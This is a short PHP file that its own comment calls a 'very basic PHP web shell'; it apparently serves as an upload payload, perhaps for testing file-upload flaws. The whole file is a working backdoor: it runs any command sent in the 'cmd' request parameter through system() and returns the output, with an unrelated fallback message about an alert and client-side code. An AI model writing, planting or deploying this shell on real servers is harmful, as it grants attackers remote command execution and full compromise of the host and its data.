<?php
// Very basic PHP web shell
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
} else {
    echo "If you see the alert message, the file executed client-side code";
}
?>
